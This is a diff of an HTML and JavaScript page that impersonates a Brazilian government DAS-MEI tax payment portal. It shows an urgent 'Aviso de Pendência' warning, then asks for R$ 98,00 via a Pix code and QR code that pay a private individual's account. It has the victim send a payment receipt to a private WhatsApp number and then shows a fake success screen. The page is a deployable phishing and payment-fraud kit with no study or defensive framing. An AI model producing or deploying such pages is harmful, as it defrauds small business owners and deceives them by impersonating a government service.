-                <input type="text" class="copy-paste-text" id="pix-key" value="00020126360014br.gov.bcb.pix011466707517000123520400005303986540598.005802BR592566.707.517 Leonardo Sebas6014RIO DE JANEIRO62070503***630479DE" readonly>
-                <button class="btn-copiar" id="btn-copiar-pix" type="button">Copiar</button>
-            </div>
-            
-            <button class="btn-pagar btn-azul" id="btn-ja-pago">PROSSEGUIR COM COMPROVANTE</button>
-        </div>
-
-        <!-- Tela 2: ANEXAR COMPROVANTE E ENVIAR -->
-        <div id="modal-step-2" style="display: none;">
-            <h3>Anexar Comprovante</h3>
-            <p>Para darmos continuidade à baixa do débito, anexe o comprovante de pagamento abaixo.</p>
-            
-            <div class="file-upload-wrapper">
-                <input type="file" id="arquivo-comprovante" accept="image/*,.pdf" title="Clique para selecionar o arquivo">
+            <div class="card">
+                <div>
+                    <h3>DAS-MEI - Documento de Arrecadação</h3>
+                    <p>Emita e pague o Documento de Arrecadação do Simples Nacional para Microempreendedor Individual através do sistema unificado.</p>
+                </div>
             </div>
 
-            <button type="button" class="btn-pagar btn-azul" id="btn-enviar-whatsapp">ENVIAR PARA VALIDAÇÃO</button>
-            <button type="button" class="btn-pagar btn-outline" id="btn-voltar-qr">Voltar ao QR Code</button>
-        </div>
-
-        <!-- Tela 3: SUCESSO (Pagamento Realizado Limpo) -->
-        <div id="modal-step-3" style="display: none; padding: 15px 0;">
-            <div class="success-icon-wrapper">
-                ✓
+            <div class="card warning">
+                <div class="card-icon">⚠️</div>
+                <div>
+                    <h3>Aviso de Pendência</h3>
+                    <p>Identificamos débitos em seu cadastro MEI. A regularização imediata é necessária para manter o seu CNPJ ativo e continuar utilizando os serviços digitais do Governo Federal sem restrições.</p>
+                </div>
             </div>
-            <h3 style="color: #10b981; margin-bottom: 25px;">Pagamento Realizado</h3>
-            <button class="btn-pagar btn-outline" onclick="window.location.reload();">Fechar painel</button>
-        </div>
+        </main>
 
+        <aside class="payment-panel">
+            <div class="payment-header">
+                <h3>Recolhimento MEI</h3>
+                <small>🔒 Ambiente Seguro • SSL 256-bit</small>
+            </div>
+            
+            <div class="payment-body">
+                <div class="value-box">
+                    <div class="value-label">Total a Pagar</div>
+                    <div class="value-amount">R$ 98,00</div>
+                </div>
+                
+                <h4 class="como-pagar-title">Como pagar</h4>
+                <ul class="step-list">
+                    <li class="step-item"><div class="step-number">1</div><div class="step-text">Clique no botão "EFETUAR PAGAMENTO".</div></li>
+                    <li class="step-item"><div class="step-number">2</div><div class="step-text">Escaneie o QR Code ou utilize o Pix Copia e Cola no app do seu banco.</div></li>
+                    <li class="step-item"><div class="step-number">3</div><div class="step-text">Anexe o comprovante para validar o processo.</div></li>
+                </ul>
+            </div>
+            
+            <div class="payment-footer">
+                <button class="btn-pagar" id="btn-abrir-modal">EFETUAR PAGAMENTO</button>
+                
+                <!-- Caixinhas de Benefícios Delicadas (Trust Badges) -->
+                <div class="trust-badges">
+                    <div class="trust-badge-item">
+                        <div class="trust-badge-icon">🔒</div>
+                        <div class="trust-badge-text">Pagamento seguro</div>
+                    </div>
+                    <div class="trust-badge-item">
+                        <div class="trust-badge-icon">⏱️</div>
+                        <div class="trust-badge-text">Regularização na mesma hora</div>
+                    </div>
+                    <div class="trust-badge-item">
+                        <div class="trust-badge-icon">⚡</div>
+                        <div class="trust-badge-text">Pix instantâneo</div>
+                    </div>
+                </div>
+
+            </div>
+        </aside>
     </div>
-</div>
 
-<script>
-    // Elementos do Modal
-    const modal = document.getElementById('payment-modal');
-    const btnAbrirModal = document.getElementById('btn-abrir-modal');
-    const btnFecharModal = document.getElementById('fechar-modal');
-    
-    // Passos do Modal
-    const step1 = document.getElementById('modal-step-1');
-    const step2 = document.getElementById('modal-step-2');
-    const step3 = document.getElementById('modal-step-3');
-    
-    // Botões
-    const btnJaPago = document.getElementById('btn-ja-pago');
-    const btnVoltarQr = document.getElementById('btn-voltar-qr');
-    const btnEnviarWhatsapp = document.getElementById('btn-enviar-whatsapp');
-    const inputArquivo = document.getElementById('arquivo-comprovante');
-    
-    // Funcionalidade do Pix Copia e Cola
-    const btnCopiarPix = document.getElementById('btn-copiar-pix');
-    const pixKeyInput = document.getElementById('pix-key');
+    <!-- MODAL SOBREPOSTO (CENTRO DA TELA) -->
+    <div class="modal-overlay" id="payment-modal">
+        <div class="modal-content">
+            <span class="close-modal" id="fechar-modal" title="Fechar">&times;</span>
 
-    btnCopiarPix.addEventListener('click', () => {
-        pixKeyInput.select();
-        pixKeyInput.setSelectionRange(0, 99999);
-        navigator.clipboard.writeText(pixKeyInput.value).then(() => {
-            btnCopiarPix.textContent = 'Copiado!';
-            btnCopiarPix.classList.add('sucesso');
-            setTimeout(() => {
-                btnCopiarPix.textContent = 'Copiar';
-                btnCopiarPix.classList.remove('sucesso');
-            }, 3000);
+            <!-- Tela 1: QR CODE e COPIA E COLA -->
+            <div id="modal-step-1">
+                <h3>Pagamento via Pix</h3>
+                <p>Abra o app do seu banco e aponte a câmera para o código abaixo ou utilize o código Copia e Cola.</p>
+                
+                <div class="qr-code-wrapper">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?data=00020126360014br.gov.bcb.pix011466707517000123520400005303986540598.005802BR592566.707.517%20Leonardo%20Sebas6014RIO%20DE%20JANEIRO62070503***630479DE&size=200x200" alt="QR Code PIX">
+                </div>
+                
+                <label class="pix-label">Código Pix Copia e Cola:</label>
+                <div class="copy-paste-box">
+                    <input type="text" class="copy-paste-text" id="pix-key" value="00020126360014br.gov.bcb.pix011466707517000123520400005303986540598.005802BR592566.707.517 Leonardo Sebas6014RIO DE JANEIRO62070503***630479DE" readonly>
+                    <button class="btn-copiar" id="btn-copiar-pix" type="button">Copiar</button>
+                </div>
+                
+                <button class="btn-pagar btn-azul" id="btn-ja-pago">PROSSEGUIR COM COMPROVANTE</button>
+            </div>
+
+            <!-- Tela 2: ANEXAR COMPROVANTE E ENVIAR -->
+            <div id="modal-step-2" style="display: none;">
+                <h3>Anexar Comprovante</h3>
+                <p>Para darmos continuidade à baixa do débito, anexe o comprovante de pagamento abaixo.</p>
+                
+                <div class="file-upload-wrapper">
+                    <input type="file" id="arquivo-comprovante" accept="image/*,.pdf" title="Clique para selecionar o arquivo">
+                </div>
+
+                <button type="button" class="btn-pagar btn-azul" id="btn-enviar-whatsapp">ENVIAR PARA VALIDAÇÃO</button>
+                <button type="button" class="btn-pagar btn-outline" id="btn-voltar-qr">Voltar ao QR Code</button>
+            </div>
+
+            <!-- Tela 3: SUCESSO (Pagamento Realizado Limpo) -->
+            <div id="modal-step-3" style="display: none; padding: 15px 0;">
+                <div class="success-icon-wrapper">
+                    ✓
+                </div>
+                <h3 style="color: #10b981; margin-bottom: 25px;">Pagamento Realizado</h3>
+                <button class="btn-pagar btn-outline" onclick="window.location.reload();">Fechar painel</button>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // Elementos do Modal
+        const modal = document.getElementById('payment-modal');
+        const btnAbrirModal = document.getElementById('btn-abrir-modal');
+        const btnFecharModal = document.getElementById('fechar-modal');
+        
+        // Passos do Modal
+        const step1 = document.getElementById('modal-step-1');
+        const step2 = document.getElementById('modal-step-2');
+        const step3 = document.getElementById('modal-step-3');
+        
+        // Botões
+        const btnJaPago = document.getElementById('btn-ja-pago');
+        const btnVoltarQr = document.getElementById('btn-voltar-qr');
+        const btnEnviarWhatsapp = document.getElementById('btn-enviar-whatsapp');
+        const inputArquivo = document.getElementById('arquivo-comprovante');
+        
+        // Funcionalidade do Pix Copia e Cola
+        const btnCopiarPix = document.getElementById('btn-copiar-pix');
+        const pixKeyInput = document.getElementById('pix-key');
+
+        btnCopiarPix.addEventListener('click', () => {
+            pixKeyInput.select();
+            pixKeyInput.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(pixKeyInput.value).then(() => {
+                btnCopiarPix.textContent = 'Copiado!';
+                btnCopiarPix.classList.add('sucesso');
+                setTimeout(() => {
+                    btnCopiarPix.textContent = 'Copiar';
+                    btnCopiarPix.classList.remove('sucesso');
+                }, 3000);
+            });
         });
-    });
 
-    // Abrir Modal
-    btnAbrirModal.addEventListener('click', () => {
-        modal.style.display = 'flex';
-    });
+        // Abrir Modal
+        btnAbrirModal.addEventListener('click', () => {
+            modal.style.display = 'flex';
+        });
 
-    // Fechar Modal no X
-    btnFecharModal.addEventListener('click', () => {
-        modal.style.display = 'none';
-    });
-
-    // Fechar Modal clicando fora dele
-    window.addEventListener('click', (e) => {
-        if (e.target === modal) {
+        // Fechar Modal no X
+        btnFecharModal.addEventListener('click', () => {
             modal.style.display = 'none';
-        }
-    });
+        });
 
-    // Avançar para Tela de Upload
-    btnJaPago.addEventListener('click', () => {
-        step1.style.display = 'none';
-        step2.style.display = 'block';
-    });
+        // Fechar Modal clicando fora dele
+        window.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                modal.style.display = 'none';
+            }
+        });
 
-    // Voltar para o QR Code
-    btnVoltarQr.addEventListener('click', () => {
-        step2.style.display = 'none';
-        step1.style.display = 'block';
-    });
+        // Avançar para Tela de Upload
+        btnJaPago.addEventListener('click', () => {
+            step1.style.display = 'none';
+            step2.style.display = 'block';
+        });
 
-    // Validação estrita: Só avança se o arquivo estiver anexado
-    btnEnviarWhatsapp.addEventListener('click', () => {
-        if (inputArquivo.files.length === 0) {
-            alert("Atenção: É necessário selecionar o arquivo do comprovante para prosseguir.");
-            return; 
-        }
+        // Voltar para o QR Code
+        btnVoltarQr.addEventListener('click', () => {
+            step2.style.display = 'none';
+            step1.style.display = 'block';
+        });
 
-        // Tenta copiar o arquivo para a área de transferência silenciosamente
-        const file = inputArquivo.files[0];
-        if (navigator.clipboard && window.ClipboardItem) {
-            try {
-                const item = new ClipboardItem({ [file.type]: file });
-                navigator.clipboard.write([item]).catch(() => {});
-            } catch (e) {}
-        }
+        // Validação estrita: Só avança se o arquivo estiver anexado
+        btnEnviarWhatsapp.addEventListener('click', () => {
+            if (inputArquivo.files.length === 0) {
+                alert("Atenção: É necessário selecionar o arquivo do comprovante para prosseguir.");
+                return; 
+            }
 
-        // Abertura do WhatsApp com a mensagem pré-configurada
-        const mensagem = encodeURIComponent("Olá! Estou enviando o comprovante de pagamento do MEI.");
-        const urlWhatsApp = `https://wa.me/5516996565112?text=${mensagem}`;
+            // Tenta copiar o arquivo para a área de transferência silenciosamente
+            const file = inputArquivo.files[0];
+            if (navigator.clipboard && window.ClipboardItem) {
+                try {
+                    const item = new ClipboardItem({ [file.type]: file });
+                    navigator.clipboard.write([item]).catch(() => {});
+                } catch (e) {}
+            }
 
-        window.open(urlWhatsApp, '_blank');
+            // Abertura do WhatsApp com a mensagem pré-configurada
+            const mensagem = encodeURIComponent("Olá! Estou enviando o comprovante de pagamento do MEI.");
+            const urlWhatsApp = `https://wa.me/5516996565112?text=${mensagem}`;
 
-        // Exibe a tela final limpa de "Pagamento Realizado"
-        step2.style.display = 'none';
-        step3.style.display = 'block';
-    });
-</script>
+            window.open(urlWhatsApp, '_blank');
 
+            // Exibe a tela final limpa de "Pagamento Realizado"
+            step2.style.display = 'none';
+            step3.style.display = 'block';
+        });
+    </script>
 </body>
 </html>
